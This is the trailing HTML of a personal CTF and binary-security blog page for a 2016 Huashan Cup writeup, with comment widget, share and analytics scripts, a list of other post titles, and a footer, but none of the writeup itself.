<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
<div class="duoshuo" id="comments">
<!-- 多说评论框 start -->
<div class="ds-thread" data-thread-key="2016/09/11/2016-Hs-ctf-SeeSea-writeup/" data-title="2016-中国·西安 华山杯 Writeup-SeeSea" data-url="http://bestwing.me/2016/09/11/2016-Hs-ctf-SeeSea-writeup/"></div>
<!-- 多说评论框 end -->
<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
<script type="text/javascript">
    var duoshuoQuery = {short_name:"WinMin"};
    (function() {
        var ds = document.createElement('script');
        ds.type = 'text/javascript';ds.async = true;
        ds.src = '/js/embed.js';
        ds.charset = 'UTF-8';
        (document.getElementsByTagName('head')[0] 
         || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
    </script>
<!-- 多说公共JS代码 end -->
</div>
<div class="scroll" id="post-nav-button">
<a href="/2016/09/18/tell_myself/" title="上一篇: 有时候想想 是得规划一下自己了">
<i class="fa fa-angle-left"></i>
</a>
<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
<a href="/2016/09/10/Common types of RSA/" title="下一篇: 一大波RSA就要来了~~">
<i class="fa fa-angle-right"></i>
</a>
</div>
<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/07/2017-SSCTF-Pwn/">2017- SSCTF-Pwn250</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/01/2017-defcon-peROPdo/">2017 DEFCON ---  peROPdo writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/23/2017-360chunqiu-online/">2017 360春秋杯线上 部分Pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/23/after-upgrade-gdb-wont-attach-to-process/">解决升级pwntools  gdb.attach不能弹起gdb</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/17/cstc-xatu-writeup/">第三届全国网络空间安全技术大赛(线上初赛)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/write-kernel-exploits-2/">linux-kernel expoit  study (3)---栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/write-kernel-exploits-1/">linux-kernel expoit  study (3)---NULL dereference</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/add-a-system-call/">linux-kernel expoit  study (2)---添加系统调用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/04/Complie-linux-kernel-and-running-it-using-qemu/">linux-kernel expoit  study（1） ---编译并用qemu运行内核</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/01/hoo_free/">Hook_free  解决保护全开的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/30/《程序员的自我修养》读书笔记/">《程序员的自我修养》读书笔记---ELF文件结构</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/29/2017-0CTF-部分Pwn/">2017年 0CTF---部分Pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/28/愿你出走半生，归来仍是少年/">不忘初心</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/26/markdown图片设置方法/">Markdown中对图片进行居中,设置大小等操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/24/stack-overflow-four/">基础栈溢出复习 四 之 BROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/stack-overflow-three/">基础栈溢出复习 三 之 SROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/19/stack-overflow-two/">基础栈溢出复习 二 之 ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/18/stack-overflow-one/">基础栈溢出复习 之基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/2017-NJCTF-part-writeup/">2017 XCTF 南京站　线上赛　NJCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/08/angr-study/">angr初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/28/ichunqiu-CTF-Pwn-2017-2/">i 春秋-CTF-Pwn-2017-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/python-沙箱-逃逸/">Python沙箱逃逸</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/15/Memory Leak &amp; DynELF/">leak技巧以及DynELF的温习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/13/WiFi_Attack/">蹭隔壁的WiFI</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/02/Those-of-the-Breakpoint/">断点的那些事</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/使用Git开发使用介绍/">使用Git开发使用介绍</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/19/Windows-Kernel-Exploit-Study-1/">Windows Kernel Exploit Study(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnable刷题日记/">pwnable刷题日记 第一阶梯部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/30/one-gadget-rce/">One gadget rce</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/15/CSRF-Preliminary-Study/">CSRF初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/23/ichuqiu-reverse-November/">ichunqiu百度杯-十一月reverse专题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/18/Second Shanghai college students ' network security competition/">第二届上海市大学生网络安全大赛 Re400</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/13/2016-SUCTF-Writeup-pwn/">2016-SUCTF-PWN-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/10/As-a-Software security engineer-must-know-and-read-books-recommended/">作为一个二进制安全学习者必知必读的书籍推荐</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/08/ichuqiu-pwn-November/">ichunqiu百度杯-十一月pwn专题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/22/基于zio的exp初次尝试/">一次基于zio编写pwn的exp的尝试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/16/2016-sycgeek-Writeup/">Sycsec-极客大挑战-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/29/2016-NUCA-pwn-Writeup/">NUCA---pwn-2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/The_hulling_method/">逆向学习——脱壳方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/18/tell_myself/">有时候想想 是得规划一下自己了</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/2016-Hs-ctf-SeeSea-writeup/">2016-中国·西安 华山杯 Writeup-SeeSea</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/10/Common types of RSA/">一大波RSA就要来了~~</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/08/2016-NUCA-Reverse-Writeup/">全国高校网安联赛--逆向篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/05/2016-ichunqiu-September/">百度杯 CTF夺旗大赛 ---ichunqiu</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/05/Want to say a bit/">一点想说的</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/27/John the Ripper password cracker/">John 破解rar 或者 zip密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/23/wooyun搭建/">记一次在服务器上wooyun搜索站的搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/ubuntu-mount-new-disk/">ubuntu系统新增硬盘空间</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/29/渗透测试/">这是一波 ichunqiu在线挑战攻略 -(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/29/记一次Hexo主题的修改/">记一次Hexo主题修改</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/27/CTF-Misc&amp;Crypto-Tools/">工具以及脚本的整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/i春秋30强部分通关指南/">i春秋30强部分write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/ichunqiu-Tencent-top30-Pwn/">ichunqiu-Pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/浅谈格式化字符串漏洞/">浅谈格式化字符串漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/24/利用阿里云搭建VPN/">利用阿里云搭建VPN</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/2016黑客西部大会/">2016黑客西部大会</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/28/2016-Networ-space-security-technology-competition-of-shaanxi/">陕西省网络空间安全技术大赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/26/2016-PCTF-Writup/">Phrack--CTF 整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/2015-CCTF-Writeup/">酱油之旅--CCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/14/Hexo-Use/">Hexo 使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/27/Hexo-Theme/">Hexo 主题：SPFK</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/27/Hexo-use-Introduction/">Hexo的使用介绍</a></li></ul>
<script src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
<script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>
<script>
</script>
</div>
<footer id="footer">
<div class="outer">
<div id="footer-info">
<div class="footer-left">
                © 2017 Swing|浮生若梦
            </div>
<div class="footer-right">
<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
</div>
<div class="visit">
<span id="busuanzi_container_site_pv" style="display:none">
<span id="site-visit">表哥到访数: 
                            <span id="busuanzi_value_site_uv"></span>
</span>
</span>
<span>, </span>
<span id="busuanzi_container_page_pv" style="display:none">
<span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
</span>
</span>
</div>
</div>
</footer>
</div>
<script src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/main.js"></script>
<script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(http://oezgohqzq.bkt.clouddn.com/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>
<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>
<script src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/MathJax.jsconfig=TeX-AMS-MML_HTMLorMML" type="text/javascript">
</script>
<div class="scroll" id="scroll">
<a href="#"><i class="fa fa-arrow-up"></i></a>
<a href="#comments"><i class="fa fa-comments-o"></i></a>
<a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>
<script async="" src="./2016-中国·西安 华山杯 Writeup-SeeSea  Swings'Blog浮生若梦CTFerBinaryPython/busuanzi.pure.mini.js">
</script>
<script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>
</div>
</body>
</html>